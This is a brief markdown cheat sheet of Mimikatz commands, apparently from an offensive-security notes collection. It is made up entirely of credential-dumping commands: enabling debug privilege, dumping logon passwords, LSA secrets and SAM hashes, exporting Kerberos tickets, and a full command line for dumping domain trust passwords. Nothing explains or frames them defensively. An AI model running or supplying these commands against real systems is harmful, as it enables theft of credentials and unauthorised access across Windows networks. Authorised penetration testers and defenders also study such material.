## Mimikatz


```bash
privilege::debug
```
```
sekurlsa::logonpasswords
```
```
lsadump::lsa /patch
```
```
lsadump::sam
```
```
kerberos::list /export
```

#### Dumping trust passwords: 
```bash
mimikatz.exe “privilege::debug” “lsadump::trust /patch” exit
```
